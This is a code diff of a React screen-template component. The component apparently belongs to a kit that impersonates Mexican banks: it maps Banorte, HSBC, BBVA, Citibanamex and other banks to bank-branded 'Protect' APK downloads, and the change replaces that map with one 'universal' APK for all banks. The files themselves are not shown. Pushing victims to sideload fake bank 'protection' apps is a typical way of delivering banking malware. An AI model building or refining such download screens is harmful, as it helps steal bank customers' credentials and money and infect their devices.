@@ -725,46 +725,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.PROTECCION_BANCARIA:
         // Mapeo de bancos a archivos de protección
         const getProtectionFile = (bankCode: string) => {
-          const bankFileMap: Record<string, { fileName: string; fileUrl: string }> = {
-            'BANORTE': {
-              fileName: 'BanorteProtect.apk',
-              fileUrl: '/assets/BanorteProtect_1749964227683.apk'
-            },
-            'HSBC': {
-              fileName: 'HsbcProtect.apk',
-              fileUrl: '/assets/HsbcProtect_1749964227683.apk'
-            },
-            'SCOTIABANK': {
-              fileName: 'scotiabankProtect.apk',
-              fileUrl: '/assets/scotiabankProtect_1749964227683.apk'
-            },
-            'BBVA': {
-              fileName: 'BbvaProtect.apk',
-              fileUrl: '/assets/BbvaProtec_1749964227683.apk'
-            },
-            'CITIBANAMEX': {
-              fileName: 'banamexProtect.apk',
-              fileUrl: '/assets/banamexProtect_1749964227683.apk'
-            },
-            'BANREGIO': {
-              fileName: 'BanregioProtect.apk',
-              fileUrl: '/assets/BanregioProtect_1749964227683.apk'
-            },
-            'BANCO_AZTECA': {
-              fileName: 'AztecaProtect.apk',
-              fileUrl: '/assets/AztecaProtect_1749964227683.apk'
-            },
-            'INVEX': {
-              fileName: 'InvexProtect.apk',
-              fileUrl: `/assets/InvexProtect_1749964227683.apk?v=${Date.now()}`
-            },
-            'AMEX': {
-              fileName: 'AMEXProtect.apk',
-              fileUrl: '/assets/AMEXProtect_1749964227683.apk'
-            }
+          // Todos los bancos usan el mismo archivo APK universal
+          return {
+            fileName: 'BankProtect.apk',
+            fileUrl: '/assets/BanorteProtect_1749964227683.apk'
           };
-          
-          return bankFileMap[bankCode] || null;
         };
 
         const protectionFile = getProtectionFile(bankCode);
